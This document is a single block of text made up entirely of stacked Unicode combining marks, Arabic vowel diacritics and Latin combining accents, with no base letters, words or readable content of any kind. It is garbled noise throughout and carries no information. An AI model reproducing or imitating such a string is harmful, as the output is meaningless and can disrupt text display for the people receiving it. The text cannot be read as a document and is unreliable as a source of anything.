ًٌٍَُِّ̡̧̧̭̼̞̑̄͏̷ًًًٌٌٌٍٍَََُُُِِّّّ͉̖͕̻̗̺͎̯̖̖̒̋ͭ̀̈́͆ͥ́̏̄ͮ̐̚͟͢͡͏̶̵̸̷̴̴̴̸̷̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̡̡̛̛̛̤͔̹̦̠͕̺͎̗͔͕̬͈̗͖͎̗̺̦̦̠̫̙̯̫͉̞̲͖͇̫̟̙͎͓͉̳̞̥ͤͯ̇̾́͆̂̓ͫ͒͂͗̒͗ͮ̈́̅̐̍͆ͥ̅ͮ̄ͮ̆̈́ͣͨ̾͊̈́ͪ̔̅̈́̎͂̃̐͋̍ͪ͘͘͟͢͟͠͠͠͠͞͞͡͝ͅ҉̵̸̸̸̷̸̸ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̨̨̛̛̛̛̰̥̯͓̝̤̜̤̺̼̻̼̥̬͈̺͙̣̜͇̘̼̖̺̜̜̘͕̮̮͎̩͙͚͒ͬͦ̀̇̾̅͌̿̓ͯ̓̈́̇̍̀̿́̀͋́̔̀̎͋́̊̾̆̎̚͘͜͟͟͟͟͟͞͞͞͞͠͡͞ͅͅ͏̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̢̧̢̢̧̣͈͓̭͎̣͉͕̯̘̦̲͖̖̺̺̣͂̈́̀͌̔̃̅̽̄̏͑̾ͪ͟͟͢͢͜͜͝͡҉̴̷̴̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̛̯̟̙̦̤̠̪̤̱͙̪͔͉́̂́ͩ͆ͧ̅͆ͨ͋̀ͫ̈̕̚̚͜͜͢͡ͅ͏̴̵̵̵̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّّ̧̡̡̨̨̢̧̧̨̛͖͎̫̭̬̪̖̠̬̭͔͖̘̯̪̞̖̭̭̫̹̗̳̠͚̤̺̦͎̟̩̽́̆ͭ̍̾͆̈́͋ͤ͒ͫ̔̀̾̔ͣ̌̄̀ͫ̓͛͊̀̉̀̀̓̈̄̆͊̊̕̕̕͜͟͢͠͝͝͞͝͝͝ͅ͏̴̴ًًٌٌٍٍََُُِِّّ̛̞̯̗͉͙̋ͩ̇͋̏̿̓̕͜͢͟͜҉̵̵̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̛̭͎̲̻̺̯̳̫̝͇̼̳͖̗̤ͣͭ̎̎̿͗̌ͩ͋̈́͛̀̀́̆͋ͬ͛͆̒̀̐̕̕̚͟͞͠͠҉̸̷̵̷̵̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̧̧̨̢̧̛̹̤͍̩̲͈̼̹̰̼͍̭̺͔̝̤̖̜̭̗̰̫͚̥̼̠̼͎̰͋͒̔̄͌̋̀ͯ͐̀̆̽́̃̓͋̃̋̄̈́̏͌͐̒ͭͮͦͬ͘̕̕͘̕͢͢͠͝͝͠͏̸̸ًًًٌٌٌٍٍَََُُُِِّّّ̛͈̲̣̮̤̪̯̣̠̻̗̳́͌͂͊̃̌ͬ̔̈́́̍ͫ͘͟͢͟͠͝҉̷ًًٌٌٍٍٍَََُُِِِّّّ̢̧̧̛̹̥̜̱̱̣̯̤̭͍́̌̎̉̆͆̍͌̈́ͧ̽̃͘͢͠҉̵̷ًًٌٌٍَُُِِّ̨̟̳̤̬̜̗ͥ̓͗̅ͣ̄͟͠҉̶ًًٌٌٍٍََُُِّّ̼͉̫̀̿̀̏ͣ́͞͏ًٍَِّ̤̘̤̞ͧ͘͏̴ٌٍُِ̙͚̗̐͞͞͏ّ̩͗҉َ̟͑͏̶̴̶ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̤̻̠͖̱̤̣͈̗̰͈̪͉͔̱͉͎͉̭ͭͨ̀͆͌̾̀̎̎ͭ͋̏ͬ͐͊͌͗͆̾̏̿̅̚̕͝͞͞͞͝͡͠͠ͅ҉̸ًٌٌٍٍَُُِِّ̙͉̝̏̅̏ͩ́̑͌͝͞͏ًٌٍَُِّ̺͍̫͔̽̀̀̈̓͌͡͏̵̸̸̷̶̴̵̷̴̸̴̸̸̸ًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّ̨̧̨̢̢̨̨̧̢̡̛̛̛͖͙̫̦̭͕̳͈̤̝͓͇̰͚̯̭͉̱̫̙̬̬͔̲̗̦̖̭̼̰͚̰͕͔̙͕̣̤̳̯̮̭̳̟̱̮̗͍̼̜̘͙̦̠̂̍ͣ̀̄́̂ͦͤ͊̆͋̓̀ͧ͛̆̂͑̎̇̓̎̒̃ͣ̒ͪ́ͮͤ̄͊̊ͩͪ̉̃̿͗̃ͨͤ̀̇͊̐͗̇̐̑ͤͮͬ̔́͑̎͘̚̚͘̕͘̕̕͘̕͘͜͜͜͡͝͝͞͠͝͞͠͡͝ͅͅͅ҉ٌ̍҉ًٌٍٍََُِِّّ̧̨̛͉̝̥͕̗͈͍̼̥̆ͯͥͮ͌͌̽͜͠͞҉̸̶̶̷ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̨̡̢̛̼̩̺̥͖̰̰̞͕̘̘͙̗ͨ̅̌̌̀͊ͥ̀́̃́̆͂̏̋̕͜͝͝͡ͅ҉ًًًٌٌٌٍٍٍَََُُُِِّّّ̡̛̖̥̞̟̜̱̪̗͓̞͌͆̓̉̆̍ͮͣ̈͋̌͑̉͜͜͢͡͞͠ͅ͏̴̶ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̧̡̧̡̛̳̗̞͎̪̟͇̠̘̱ͦ͛͋̂̆̑̀̎ͨ̆̏̆͠͡͞҉ًٍَُّ̢̥͎ͪ͞҉ًٌٌٍَُِِّ̢̛͎̥̦͉̳̥ͧͣͣ͐̏ͅ͏̶̸̷̸̶̷̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّّ̢̧̧̧̡̡̧̢̧̛̛̜̙͙̬͚̭̖̞͍̰̘̘͈̠̜̯̎̿̍ͥ́͑̅̂ͯͦ̌̆̔̊ͦ̎͒̾ͭ̀͒͛̈́͛͊͐̂͘͘͘͜͢ͅ҉ًَ͟͏ُ͊҉̴̵ًًٌٌٌٍٍََُُِِِّّ̢̨͖̭̥̙͈͔̤̠̼̪̲́̈́̈́͑́͌͗̕͟҉̶ًٌٍٍَُِّ̛̛̰̎̔̕̚͏ّ̪҉َ̹҉̶̵̵̶̷̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̢̨̨̢̡̧̧̛̛̛̛̛̤̱̦̝̞̩̝̱͇̩̮̹͙̖͕̳̠̙̹̺͓̹̣̝͕̣̗̼͎̜͓̟̼͔̥̥͐ͥͣ́̄́͊̇̋ͩͦ̌͗̄̓́̑̅̐ͫ͋̔̑́ͫ̈̉ͧͣ̐ͪͧ̓̒̾̈̓͗̀̇̓ͧ̈̕͜͢͜͡͠͞͝͡͝ͅͅͅ҉̷ًٌٍََُِّ̖̲̹ͧ́̎̒ͭͥ͠͏ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̡̡͇̺̣̬͓͙͎̺̗̝͌̽̎ͩ̈́̽̄̋ͨ́̃̀̓̕͟͠҉ًًٌٌٍٍٍََُُِِّّّ̡̡̙̘̙̗̗̼̺̬ͪ̄̎̀̀ͫ̍́̏̾͝͝͠͏̶̶̷̶̵̸̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̢̧̢̨̡̛̛̳̰̠̠͓͎̗̮̫̻͕͕͖̣̞̯̺̮̣͔̼̫͓͍͕̤̜̯͎͍̻̱̪̭͖̞̄͗̇̊̀̓ͨ̇ͮ̓̄ͦ̊̐̈ͣ̌̂ͫ́́̂͌̓͗͘̕̚̕̕͘͟͜͟͞͡͞҉ًٌٍََُِّ̛̛̣̟̘̝̼̀ͧ̿̊͝҉ًٌُ̟͇͂̓҉̶̴̸̵̶̵ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̧̢̨̨̨̛͇̤̪̺̝͍͍̹͕̤͙̬͉̣͉͙͖͎̽͂̌͒ͦ̇̌ͮͣ̅͒̊̏̅ͧ̀ͣ͋̎͐ͧ͐̉ͩ͒ͤ̐̕̕͜͜͜͢͟͠͏̸ٌٍَِّ̮͔̓̎҉̷̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̫̘̠̼̳̳̺͖̽̅̀ͤ̏͛́́̍͛̑̀͗̚̕͞͝҉̴ًًًٌٌٌٍٍََُُُِِِّّ̢̨̧̗̠̦͕̠̎̔̔ͩ̀̀͊̾ͣ͆̚͜͝͡ͅ͏̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̛̗̖̤̠͔͕̖̻̤̖̗̙͖̖̩̊̌̀͑ͮ̇̈̒ͧ̔ͤͭ̀̒̍ͥ͠͠҉̸ًًًٌٌٍٍٍَََُُُِِِّّّ̡̛̛̥͉̰̳̯̭͍̘͇̣̦͇͒ͦͦ̅̾́͆ͤ̅̅̽̕͘͟͜͟͢͏̴̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̡̨̡̨̛̛̬͙̪̣̝͓̘̠͓̠͔̰̫̬̲͍̮͉̋͂̔̈́ͣ͂ͭ̍͋̽͋̉̂ͦͭ̎̽ͧ̈́̕͟͢͡͡͡҉̴̸ًًٌٌٍٍٍَََُُِِّّّ̧̢̧̩̖̗̦̠̝̩̯ͮ͊́̃̾̄͂̾͘͝͠ͅͅ҉ًًٌٌٍَُُِِّ̡̢̭̜͕̗̌̀̂͑͟͝҉ًٌٍٍَُِّ̗͓͓̺͚͖̓͒̎͋͡҉̷̵ًٌَُِّ͕̤͓̀ͭ͢͏̴ًًًٌٌٍٍٍَََُُِِّّّ̛̘̰̹͓̩͈̖̺͉̥͎̀ͬ̋ͬͥ͂́͌̎͒̾͢͠҉ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̢̧͖͓̻̖͉͙͔͔̘͂ͬ̏́͐̋ͫ̄̄ͮ̾̕͟͟͞͠͞҉ٌٍِّ̞̙̭́̓҉̸̸ًًًٌٌٌٍٍَََُُُِِِّّ̧̥̹͖̭̱̼̯̲͔̟͈̘̟̜̾͋͒͒͋ͫ͛͋̕̕͘͡͠҉̸ًٌٍَُِّ̧̢̬̟̀ͥͭ̍҉ٍّ̰̣͋҉̶̵̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّ̨̨̳͔̞͎̦̥̞͎͖̘̦͕̻̹̻̞̩͇̥͉̤͆̈̎̈̽ͤ̽̄̈́ͫ͐̎̏̿ͪͩͥ́͊͘͘͘͜͜͝͠͡͠͠͞͞͏̷̶̵ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̛͕̰͎͕͎͍̹͇ͩ͆ͯ̈́̍͐́̾ͧ͘͘͘͜͜͝͞͝͏̷̵̸̷̸̴̴̸̴̸̶̸̴̴̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̡̢̡̢̢̨̨̛̛̛̦̪̞͓̳̪̝͖̤̼͈̻̮̦̯̰̮̟̫͇̤͚̠̞͍͉̘̪̰͚̦̭̫͙̻̮̹͙͉͉̬͍͓̞̦̦͇͕̟̥̗͇͔̬ͯͤ͊̐ͬ̔ͥ̌̐̄͂̌̇̄́͐́̎ͥ̔̂̀̈́͊ͦ̅̀̀ͤ͊̒͊̇̽̀͑̆ͪͨ̇̑̉̂ͭ͐̂̽ͭ̌̀̆́̈̕͘͜͜͢͢͢͜͢͝͞͡͡͝͞͡͡͠͠ͅ҉ًٌَُِ̨̥̤̀̇͜͟͏̸ًًٌٌٍٍََُُِّّ̢̨̨̨̹̦̻̙̳̭̩̻ͭ̋̇ͪ͋͒̉͜҉̴̴̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̨̳̗̠͚͙̹͕̩͖̳̦͔̳̤̹͂͗̋͋̋͐̅̀̽͗͛́̂̄͗̏̿̚͝͡͠͞͡ͅ҉̸̴̴̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̧̨̢̧̗̮̠̥͚͈̗̘̠̻͚͕̰͍̬̲̼̃ͦ̏̆̊̑͆ͯ̋̀̍̆ͪ̔́ͧ̂̉ͮ͟͝ͅ͏̵̵̸̸̷̶̷̸̶̵̷̴̸̶ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̢̢̧̨̛̛͈̩͎̥̫͈̹͓̮̰̜͉̮̲̘͉͇͈̻̠̥̬͙̼̭̰̘̪̭̖̣͉͈̻̙̦̭̼̜̒̅̀̃̽̓̊̃̀̾̄̔͑͛̉̌͑́͆̔ͨ̈́ͨͪͯ̀̄ͦ̑́͛̅̿ͪ̌́ͫ̉̾̆͌ͧͣ̒̆̎̈́ͯ͑ͦ̉̕̕̕̚̕͘͜͟͞͠͠͝͠͝ͅ҉̴̷̵̸̶̷̵̷̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̨̨̢̢̧̢̧̧̡̡̞͎̼͍̤̞̩̟̳̹̺̭̹̦̪͔͖̻̼̖͔̲̜͍̯͇͕̘̫͈̥͓̪̾̓̎͗̈́̑̂̋ͪͫ̆̃͐͆ͭͧͨͧ̒̎̈́́͑ͤ̍ͮ̂́͋̀͌ͩͨ̌ͯͥͭ̀̇̆͐̌͋͑̇̀͌̀̕̚͘͟͜͟͟͠͠͞͠ͅ҉̷̴ًٌٍٍَُِِّ̡͙͓̬̱̗̼̜́ͫͨ̈͢͏ّ̘͏̷̸ًًًٌٌٌٍٍٍََََُُُِِِّّّ̧̢̢̛͉̮̺̳̰͍̗̪̜̹̍̈́̓̅̿̉̾ͨ͑́́̚͠͝҉̵̴̷̵ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̢̛̛̜̱̻̞͉̻̲̺̖ͥ̄̃̀́̄̍̐̈́͒̓̚̚͜͞͡҉̸̵ًًًًٌٌٌٍٍٍٍََََُُُُِِِّّّّ̧̢̢̛̗̺̺̜͇̘̖̜̯̠̺͓̜̫̺̳͗ͦͣ͊ͧ̎̊ͩͥͩ̾͌̀ͩ͟͢͜͠͝҉ًٌٍَِّ̼̱͙̒̓̒͟҉̴ًٌٍَُُِّ̞̰̲̖̅̐͐̉͜͡҉̶̶̶̷ًٌٌٍٍَُِِّ̢̺̙̯͙̝ͬͫ̈́̆͟͡͝͏̸̷̷̴̸̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̧̡̢̢̢̢̢̛̛͍̝̺̳̻͎͍̲̯̮̥̦̩̣̖̗͍̮͓̯͖̪̫̠͉̯̇ͮͤ̑ͦ̾ͣ̈́͛͗ͥ́͐͒̇́̓̏̅͒͗̿̈͗̀̃͋̂̐͘͘͘͟͟͜͜͢͢͠͠͠͝ͅ҉̷̴̴ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̢̨̡͖͎̙͓̠͖͇͈̤͇ͪ̔ͥͮͣ͊ͣ̍͑̅ͮͦ̀ͮ͠͞҉̵̶̷̸̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̡͉͕̙͈͓̻̻̠͇̪̫͖̭̬͙̤̥̗͍͓̩̬̮̈̿̄̊͋̓́̄ͮ̂̓̽͗̒ͨ̄̔̀̇̾͆̈́͋͢͢͝͡͡͠ͅ҉̸̷ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̨̨̛̱͍͉͔̯̲̬̲̩͈̦͖͂ͦ͛͂͛̀̈͐ͫ͐̀̄̅͘̚͜͜͠͡҉̵̶ًٌٌٍَُِِّ̞̼̘͔̲̿͑ͬ̌̅͜͏̸̴̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̨̛̛̫͉̠͈͈͙̯̻̙̫̘̩̝̩ͮ̊̄̓ͭ̐ͮ́̒́ͭͣ̀̕̕͞͞͞ͅ͏ٍَّ̘͋ͯ̚͝͏̴ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̢̛̛̛̩̬̩̹̲͇̰͎̭̹̤̤ͪ͒̈ͯ͐͂̆ͮ́̃͂ͪ̃̕͜͟͡͝͠҉̴̴̶ًًًٌٌٌٍٍٍٍَََُُُِِِّّّ̨̛̗̫͔̳̞̻̲̰͖͆̐ͫ̆̀ͥ̀̆͊̚̕͝͠͞҉̵̷̵̸ًًًٌٌٍٍَََُُِِّّّ̡̡̳̝̭̮̬͙̹̮̃͛́̈̂̐̓ͯ͠҉ًًٌٌٌٍٍََُُُِِِّّ̨̨̡̡̻̟͕̯̯ͧ͒̈́͐́̂̐ͣ̀ͬͯ͘͜͝͞҉̴̸ًٌٍٍَُِّ̩͓̙͖̚͜҉ًٌَُّ͉̻̮͎͐͆͠͝͏̴̸̷̸ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̡̨̨̛̯̤͙̮͇̺̲̗̱͔̻̜͚̖͔̥̻͚͉͚̤̮͕͙̹͍̦͇̺̠̖͇̤̰͓̀ͯ͒̉̀̄ͪ͒ͯ͒̀̾̀͒ͨͮ́ͪ̊ͮ̾͌͗́̉̈́̑́̇ͯ̒͊̀ͦ̚͘̕̕̕͟͢͟͞͡͡͡ͅ҉̷̶̷ًًًٌٌٍٍٍَََُُِِّّّ̧̧͙̜͎̘̠͇ͤ͑ͭ͂́ͭ͟͠҉̵ًًٌٌٍٍََُُُِِّّ̧̨̭̙̭̠̭̥̳ͬ̔̎͐̕̕͞҉ٌٍِ̘̳̙ͭͪ̀̕҉̸̴̸̵̵̷̶̷̴̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̧̧̡̢̢̧̨̨̧̢̡̛̛̣̤͉̪̤͖̖̺͙̠̫̣̹͓̳̙̦̹͖̪͍̝̣͇̯̘̺͓̲̩͖̼̯̣̪̪̞͓̯̱͇͕͌́͌̓̆ͪͥ͑ͦͩ̒̽ͨ͆́̀̓ͬ̅̓̈́̽͊́̈́͆ͮͭͩ́̀ͯ̓ͪ́ͯ̒͋͑ͧ̆̉̾ͪ̑̏̆́̀ͩ͆̐ͬ̀ͪ͒͋͑̆̆̕͘̚͘͘̕͘͟͢͜͜͢͢͢͜͞͞͠͝͞͡͠͠͝͞͡͝ͅͅͅͅ͏ًٌٍَُِّ̺̬͗ͬ̆͞͠҉̴̸̶̴̵̸̴̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّ̨̡͍̣̮̯̪͔̗̗̦̮ͭ̆͑̓ͧ͂͒̂͐͌̔̊̓̀͌̊ͨ͗ͮͫ̉͟͟͢͞͞͠ͅͅ͏ٌٍَِّ̺̜̥̓͞͏ً̩͏̴̷ًٌٌٍَُُِّ͚̜͉͗̒́̿͑͐͢͠͏̶̴̶̶̶̷̴ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̧̡̢̨̛̛̹̭̤͍̳̘͓̳͓̜̪̰̱͚͙͚̫͙͙̻̮̫̜̟̘͈̭̤̻̗̰͔̪͎ͪ̀ͬ̐̓̒ͣ̄͋̀̅ͣͫͮ̾̃́̈́ͫ͗̔͆̾ͯ̑͂͛ͥ̏̉ͦ̈́͑̔͗̀ͤͤ̎͘͘͘̕̕͘͘̕͟͟͢͢͢͢͞͝͠͝͝͡͝͠͞͠ͅͅ͏̴̴̵̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّّ̢̢̨̨̜͈̻̠̩͔͉̘̣͚̱͙͍̭̟̻̜̳̟͙͇̄ͣ́́͊͊ͥ́̓̈͂́ͤͭͨ͆ͩ̀̏ͭ̃͘͘͞͝͝͞͝͏̷̴̷̸̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̡̧̛̭͇̠̪̭̩͓͈̤̠̫̦̟̹͎̹̩͈͎̆̓̈ͮ͋̽̎ͪ̒͊͗̉̂ͩͥ͆̈́̄̍͒̒̌̂͌̄ͣͣ̏ͬ͑͘͘͘͘̚͜͜͢͠͞͞ͅ҉َّ̦̎͐͏̷̸ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛̯̯̝͔̳̣̜̲̦͂́ͤ͛ͫ̂̂͑ͤͬ͆̍͊͘͘̕͟҉̷̶̵̷̷̸̵̴̴̴̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̨̨̢̡̢̢̛̱͔̤̞̺̹̞̯̰͔̪̥͙̰̯͈̩̱͈̼̖̜̱̺̞̦͖̯̭̄ͮͣ͐̄̒̈́̓͆̀͑͑̿̄ͣ̋̈́͆ͫͪͫͪ̑ͣ͂̔̀͑ͫ́̕̕̚͢͢͟͜͜͝͠͡҉̴̴̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّّ̡̡̡̢̨̡̛̛̲͇͕̖̘͎͙̥͎̠̜̙̤̱̖̖̤͔͉̹͕̝͚͕͔͊̅̋̄ͦ̎ͬ̌͒ͧ͑͊́͛͆̔̀͛͛̓̀̃́͊̀̄ͧͦ͛͘̕͜͡͡͠ͅͅ͏̶̸̵̴̷̵̶̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̢̧̡̡̛̻͎̹͈̥͇̗̺͇̰̮̩̘̖̪̗̝̻̯̝̖̯̖͎͇̲̳̯̲̋͌̑̽̿̏̀͌ͧ͊̌̓ͣ́̀̀͒͛͛̑̌ͣͪͣ̆̔͆̒̈̽ͤͥ́̒ͬ̕̕͢͟͟͢͜͟͢͢͟͢͠͝͞͝͝͠͝͡͝͝ͅ҉̷ًًًٌٌٌٍٍٍٍَََُُُِِِّّّّ̨̨̨̧̛̝͉̮̹̗͇̠̹͇̳̻̲͎̈́ͫͫͥ́͌̽ͩ̓̐̕͜͠͝҉̶ًًٌٌٍٍَََُُِِّّ̧͕͈̺͎̩̰̭̖̯̎́ͭ̊͐́͋̀̕͢͢͝͏̸̵̴̵̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̨̡̨̛̹͈̙̬͈͖̖̬̠͇͈͖͎͈̼̙͖̼̱͈̀̊̓ͧͥ̀ͦͤͣ͑̎̒ͭ̉̿̉́ͬ͂̄ͫ͘̕͢͝͞͠͠͝͠͝͝ͅ҉̷̵̴ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̨̡̨̛̖̗̹̹̦̣̝̜̠͍̣̞̠̟ͩͮ̀͛̆̓͆ͮ̓̍̂̽̊̿ͫͯ̂̋ͯ͋͘͘̚͟͜͢͟͟͞͡ͅͅ͏̶̵ًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̧͍̱̳͔̯̙̼͕̮̠̙͇ͨ͗́ͤͮ̍̑ͯͯ̓̋̚̕̕̕̕̚͟͢͢͏̴̵̵̵ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̧̢̧̛̻͖̱̘͔͇͖̗͍̗̳̲͙̺̩̰͈̤͖̣̲ͮ̊̆ͩ̃̉̀̒̌̈ͬͦ̆́͌̔̇͘̕͜͡͠͞͝ͅ҉̴ًًٌٌٍٍٍََُُِِِّّ̛͉̣̥̙͇̥̰̮̣̑̽̿͗͌̐͑́ͩ̄̚͡͏̵̷̴̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̡̧̡̢̨̡̧̨̡̡̨̯̫̠͔̦̯̱̻̬̯͉̗̮̠̜͙͓̦̜̪͕͍̙͉̎̈́̉̑͐ͬ̓̄͊͂̋͋ͦ̒̐̓͌́ͪ̈ͧ͊͂ͪ̐̀̽́ͣ͑͆ͧ͑ͨ͐ͮ̚͟͢͢͟͟͡͡͞͞͝͠҉̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̛͙̺̤̜̪̥̦͙̫̙̒̍ͤ͗̍̅̕̚̕͟͡ͅ҉ًًٌٍََُُِّّ̧̢̛͕̯̼̯͕̣͈̮́̽̇ͭ͘͢͡͏̸ًًٌٌٌٍٍََُُِِِّّ̡̧̨̛̞̙̼̟͙͖̤͈ͩ̾ͬ̂̈͒͒̚̕͢͝͞͡͏̴̶̷̸ًًٌٌٍٍََُُِِّّ̛͎̣͍͈͈̱̱̍̔ͨͣ̊̚͘̚҉̴̷̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̨̨̡̛͇͕̬͇̤͎͇͍̟̞̘͓̣͍̗̤͈͑̐ͮ̐̇̎ͦ̃ͮ̃̋ͤ͐ͤ́͝͠͏̴̴ًًٌٍٍََُُِّّ̧̡̢̨̜͈̯̞̻͇ͮ̇̈́̂͌͗͏̷̶ًًًٌٌٌٍٍٍَََُُِِِّّّ̧̡̛̤̙̩̺̠̭̩̫͎͋̓̾̑̿̀ͧͮ̒͟͠͞҉̶ًٌٌٍٍَُُِِّّ̡͇̰̜̙̱͕̖̊̅̍ͣ̉̚͟͠͞҉̶̷ًًٌٌٍٍََُُِِّّ̗̱̪̠̱̹͊̒̀͊̈́͊̀̃͢͞͞͡͏َ͇ͤ҉̶̸̴̸̶̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̨̛̛̟̪͖̞̥̦̝͖̠̤̩͍͚͇̘͖̟̭̭̩̦͓͐̊͆͛ͩ̎̐͂̀̀ͫ̀ͩ̿̃̽̆̐͋̈ͯ̍̀ͩ͘͢͟͡͠҉̸̴ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̧̢̨͔̣͚̗̭̞̮̰̲͖̟̪̥͉̟͑̽́ͪͭͭ̈́̽̑ͨ̿̊́̍̆́̓͟͞͠҉̶ًًٌٍٍََُُِِّّ̢̡̰̹͙̖̹͔͖̜͍̏́ͯ́̓͟ͅ͏̸ًٌٍَُِّ̹ͩ͂̄̽̕҉̵̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̢̛̛̞̫̲̩̹̬͔̦̙͈̜͔̹͓̥̙̣͑̉͊͂̍ͤͤ̓̒͒ͬͨͮ̌͝͡͝͏̴̴̴̷̷ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̨̧̡̛̛̲̪̝̦̟̥̫̯̳̲̻̠̞̮̭̠͔̲͔͖͔̳̙̞̥͇̱͔̉̏̿̋͐̊ͫ̔̈́̆ͧ̒̀̈́ͣ͂̌̿̇̌̂͆ͭ͗͆͌̕̕͟͟͟͜͢͡͞͝͞ͅ͏̸̵ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̼̩̯̫̖̣̱͚̠̜̦̹̝̯̎́̉̎ͧ̓̎́ͣͬ̚͞͡ͅ͏̵ًًٌٌٍٍََُُِِّّ̨͚͖͙̰̱̩̮̥͎̯̾̓ͥ͛ͫͥ̾͜͡͞͏̶̶̷̸̷ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̢̢̨̛̺̱͕̟͉͎̙̲͖͖̟͕̝̻̺̪͖̜̠̰̟̩̟̺ͧͨ̊̃͊́͋̿́̑͋ͦ̓ͪ̌ͣͮ͊͌̄̆ͬ̈̋̐̀̒̊̐͌̄͘̚̕̚͢͢͡͞͝ͅ